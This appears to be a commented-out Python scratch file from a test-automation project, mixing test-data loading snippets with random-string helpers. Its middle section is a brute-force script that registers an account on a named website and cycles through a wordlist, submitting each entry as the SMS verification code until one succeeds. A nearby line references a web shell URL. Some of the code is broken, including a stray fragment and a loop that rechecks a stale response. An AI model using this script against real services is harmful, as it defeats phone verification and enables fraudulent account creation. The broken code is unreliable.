# # # -*- coding: UTF-8 -*-
# # # # str = '修改成功\n确认'
# # # # str1 = '修改成功\n'
# # # # print(str1.replace(" ","").split("确认")[0])
# # # #print(str.replace(" ","").split("确认")[0])
# # # #print(str.lstrip())
# # # import os
# # #
# # # from Common.getTestData import get_test_data
# # # from Common.getYaml import get_yaml
# # # data = get_yaml()
# # # #pop_deposit_binding_name = data['pop_box'].get('pop_deposit_binding_name')
# # # data_bind_card = data['datas'].get('data_bind_card')
# # # print(data_bind_card.replace(data_bind_card[4:-4],"***********"))
# # #
# # # case_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'data',
# # #                          'excels', 'case_data.xlsx')
# # # case_data = get_test_data(case_path, 0)
# # # print(case_data)
# #
# # import requests
# #
# # # url = "http://klk.9161252.com/frontend/v1/getSmsCode"
# # #
# # # querystring = {"phone":"13321184141","device":"pc"}
# # #
# # # headers = {
# # #     'User-Agent': "PostmanRuntime/7.17.1",
# # #     'Accept': "*/*",
# # #     'Cache-Control': "no-cache",
# # #     'Postman-Token': "1ca226e8-f577-4af5-82f8-2e743486e2fc,65b6580e-a611-45a0-bb9a-76aae5ada202",
# # #     'Host': "klk.9161252.com",
# # #     'Accept-Encoding': "gzip, deflate",
# # #     'Connection': "keep-alive",
# # #     'cache-control': "no-cache"
# # #     }
# # #
# # # response = requests.request("GET", url, headers=headers, params=querystring)
# # #
# # # print(response.text)
# #
# # # def exp(password):
# #
# # url = "http://klk.9161252.com/frontend/v1/userRegister"
# #
# # querystring = {"userName": "enintech0", "password": "12345678", "sms": "123456", "device": "pc",
# #                "captcha_key": "AdunBl07FTuXFpl", "phone": "13321184140"}
# #
# # headers = {
# #     'cache-control': "no-cache",
# #     'Postman-Token': "f127ef91-f069-4a48-9c96-47212f0d95ca"
# # }
# #
# # response = requests.request("POST", url, headers=headers, params=querystring)
# #
# # post_data = {}  # 创建字典集
# # s = open('pass.txt', 'r')
# # content = s.readlines()  # 分行读取字典
# # # print(content)
# # dics = len(content) / 1000
# #
# # print('当前字典中变量个数为: %s' % str(len(content)))
# #
# # print("字典将被分割为 %s 份" % str(dics))
# #
# # group = []  # 字典每行独立化,写入元组
# # for h in range(0, len(content)):
# #     password = str(content[h]).strip('\n')  # 剔除换行符
# #     # print(password)
# #     group.append(password)
# #     userRegister_json = response.json()
# #     # print(userRegister_json['code'])
# #     if userRegister_json['code'] == 400:
# #         querystring = {"userName": "enintech0", "password": "12345678", "sms": password, "device": "pc",
# #                        "captcha_key": "AdunBl07FTuXFpl", "phone": "13321184140"}
# #         res = requests.request("POST", url, headers=headers, params=querystring)
# #         print(querystring['sms'])
# #         print(res.json())
# #     else:
# #         print("注册成功！有效验证码：%s" % password)
# #         # password++
# #     # print(password)
# #     # group.append(password)
# #     # print( group.append(password))
# #
# # # print(response.json())
# # # userRegister_json = response.json()
# # # # print(userRegister_json['code'])
# # # while userRegister_json['code'] == 400:
# # #     querystring = {"userName": "enintech0", "password": "12345678", "sms": 'password', "device": "pc",
# # #                    "captcha_key": "AdunBl07FTuXFpl", "phone": "13921184140"}
# # #     res = requests.request("POST", url, headers=headers, params=querystring)
# # #     print(res.json())
# # # import requests
# #
# # # shell = 'http://192.168.1.103/hack.php'
# #
# # # v5est0r=response.write("password:v5est0r")
# # #
# # # post_data = {}  # 创建字典集
# # # s = open('pass.txt', 'r')
# # # content = s.readlines()  # 分行读取字典
# # # print(content)
# # # dics = len(content) / 1000
# # #
# # # print('当前字典中变量个数为: %s' % str(len(content)))
# # #
# # # print("字典将被分割为 %s 份" % str(dics))
# # #
# # # group = []  # 字典每行独立化,写入元组
# # # for h in range(0, len(content)):
# # #     password = str(content[h]).strip('\n')  # 剔除换行符
# # #     group.append(password)
# # #     # exp(password)
# #
# # import random
# # def Unicode():
# #     for i in range(5):
# #         val = random.randint(0x4e00, 0x9fbf)
# #         val1 = random.randint(0x4e00, 0x9fbf)
# #         val2 = random.randint(0x4e00, 0x9fbf)
# #         val3 = random.randint(0x4e00, 0x9fbf)
# #         v
# #         return chr(val)
# #         #return ''.join(random.sample(chr(val),i))
# # print(Unicode())
# # #print([Unicode(len=4) for i in range(5)])
#
# import random  ##随机数
# import string  ##随机字符串
# code_str = string.ascii_letters + string.digits  ##罗列所有字母数字
# print(code_str)
# def gen_code(len):
#     return ''.join(random.sample(code_str, len))  ##随机获取字符，用join的方式将其连接
# #print([gen_code(len=6) for i in range(5)])  ##取5个长度为6的随机序列
# # print([gen_code(len=4) for i in range(5)])  ##取5个长度为4的随机序